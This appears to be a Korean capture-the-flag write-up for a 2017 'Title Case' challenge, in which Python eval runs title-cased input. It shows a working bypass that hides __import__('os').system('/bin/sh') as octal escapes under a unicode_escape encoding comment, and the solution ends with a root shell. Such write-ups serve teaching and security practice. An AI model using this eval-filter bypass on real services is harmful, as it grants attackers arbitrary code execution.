# [2017_SHA] \[PWN] Title Case

### Problem

```python
#!/usr/bin/env python
eval(raw_input().title())
```

title 함수 때문에 원하는 함수를 호출할 수 없습니다.

가장 첫번째로 생각해낸 것은 `string[1:]` 과 같은 방식이었으나 소문자 출력까진 성공했으나 이용할 방법이 없었습니다.

```python
# Encoding: Unicode_Escape

\160\162\151\156\164\050\047\150\145\154\154\157\047\051
# print('hello')
```

하지만 위와 같이 인코딩 방식을 선언한 후, 8진수를 이용하여 파이썬 소스코드를 실행할 수 있습니다.



### Solution

```python
string = '__import__("os").system("/bin/sh")'
full = ""

for i in range(len(string)):
        full += "\\%03o"%ord(string[i])

print "# Encoding: Unicode_Escape \r"+full
```



```
root@inj3ct:~/labs/ctf/2017_sha/TitleCase# (python ex.py;cat) | python challenge.py 
id
uid=0(root) gid=0(root) groups=0(root)
```

(몇 시간 들여서 8진수로 코드 실행하는 것까지는 갔으나 '\n' 때문에 문제를 못풀고 있었다니…)